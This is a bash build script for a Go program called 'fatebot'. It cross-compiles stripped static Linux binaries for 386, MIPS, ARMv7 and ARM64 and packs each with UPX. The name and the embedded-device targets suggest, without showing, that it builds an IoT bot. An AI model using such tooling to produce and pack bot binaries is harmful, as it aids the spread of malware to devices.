#!/bin/bash

name='fatebot'

if ! command -v go &> /dev/null || ! command -v upx &> /dev/null ; then
    echo -e "\e[1;31m\"UPX\" packer, or \"Go\" compiler has not been installed!!!\e[0m"
    exit
fi

clear

echo -e "\n\e[1;32mBUILDING x32 DEFAULT...\e[0m\n"
env CGO_ENABLED=0 GOOS=linux GOARCH=386 go build -ldflags "-s -w" -o bin/${name}_386 cmd/main.go && upx -9 bin/${name}_386 && clear
echo -e "\n\e[1;32mBUILDING x32 MIPS...\e[0m\n"
env CGO_ENABLED=0 GOOS=linux GOARCH=mips go build -ldflags "-s -w" -o bin/${name}_mips cmd/main.go && upx -9 bin/${name}_mips && clear
echo -e "\n\e[1;32mBUILDING x32 ARM...\e[0m\n"
env CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -ldflags "-s -w" -o bin/${name}_armv7 cmd/main.go && upx -9 bin/${name}_armv7 && clear
echo -e "\n\e[1;32mBUILDING x64 ARM...\e[0m\n"
env CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" -o bin/${name}_arm64 cmd/main.go && upx -9 bin/${name}_arm64 && clear

echo ""
echo -e "\e[1;32m               BUILD SUCCESS!!!                \e[0m"
echo -e "\e[1;37m-----------------------------------------------\e[0m"
echo -e "\e[1;32m  YOUR EXECUTABLE FILES ARE IN THE BIN FOLDER  \e[0m"
echo -e "\e[1;37m-----------------------------------------------\e[0m"
echo ""
